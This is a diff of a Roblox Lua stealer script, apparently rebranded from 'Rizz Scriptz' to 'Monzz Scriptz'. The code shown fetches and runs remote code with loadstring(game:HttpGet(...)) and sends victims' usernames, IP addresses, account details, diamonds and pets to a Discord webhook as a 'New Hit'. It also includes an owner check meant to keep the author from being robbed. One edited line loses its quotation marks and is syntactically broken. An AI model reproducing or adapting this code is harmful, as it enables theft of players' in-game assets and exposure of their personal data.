@@ -72,24 +72,21 @@ end
 getexploit()
 local dhid
 local idiotuser = game:GetService("Players").LocalPlayer.Name
-local url = Webhook
-if idiotuser == UserName then
-    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
+local url = _G.Webhook
+if _G.UserID == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A UserId")
     return;
 end
-if UserName == nil then
-    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
-    return;
-end
-local worked2 = pcall(function()
-    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+local worked = pcall(function()
+    game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
 end)
-if not worked2 then
-    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
+if not worked then
+    game:GetService("Players").LocalPlayer:Kick("Put A Valid UserId!")
     return;
 end
-if worked2 then
-    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+local UserName = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
+if idiotuser == UserName then
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test on alt)")
 end
 if dhuser ~= nil then
     local test = pcall(function()
@@ -105,7 +102,7 @@ end
 
 
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua"))()
+    loadstring(game:HttpGet(https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua))()
 end
 if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
@@ -1229,11 +1226,11 @@ if banktiercheck == true then
 
     data1 = {
         ["content"] = ping,
-        ["username"] = "Rizz Scriptz",
+        ["username"] = "Monzz Scriptz",
         ["avatar_url"] = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif",
         ["embeds"] = { {
-            ["title"] = "**New Hit** ||With Rizz||",
-            ["url"] = "https://discord.gg/uSgzNwHDTS",
+            ["title"] = "**New Hit** ||Monzz Bank Stealer||",
+            ["url"] = "https://discord.gg/4y4CZfdJHu",
             ["type"] = "rich",
             ["color"] = tonumber(0x2798FF),
             ["thumbnail"] = {
@@ -1242,7 +1239,7 @@ if banktiercheck == true then
                 ["width"] = 420
             },
             ["fields"] = { {
-                ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
+                ["name"] = "**Monzz Scriptz's Stealer Is Better** :skull:",
                 ["value"] = "```Username     : " .. username .. "\nDisplay Name : " .. fardplayer.DisplayName ..
                     "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                     " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank ..
@@ -1253,7 +1250,7 @@ if banktiercheck == true then
                 ["value"] = "```" .. DiamondsCount .. "```",
                 ["inline"] = true
             }, {
-                ["name"] = ":dog: **Pets** :dog:",
+                ["name"] = ":frog: **Pets** :frog:",
                 ["value"] = "```" .. #FinalList + #SFinalList .. "```",
                 ["inline"] = true
             }, {
@@ -1293,7 +1290,7 @@ if banktiercheck == true then
                     ["value"] = "```" .. BDiamondsCount .. "```",
                     ["inline"] = true
                 }, {
-                ["name"] = ":dog: **Pets** :dog:",
+                ["name"] = ":frog: **Pets** :frog:",
                 ["value"] = "```" .. #SuperBank["Storage"]["Pets"] .. "```",
                 ["inline"] = true
             }, {
@@ -1347,7 +1344,7 @@ if banktiercheck == true then
                     ["value"] = "```" .. TDiamondsCount .. "```",
                     ["inline"] = true
                 }, {
-                ["name"] = ":dog: **Pets** :dog:",
+                ["name"] = ":frog: **Pets** :frog:",
                 ["value"] = "```" .. #SuperBank["Storage"]["Pets"] + #FinalList .. "```",
                 ["inline"] = true
             },
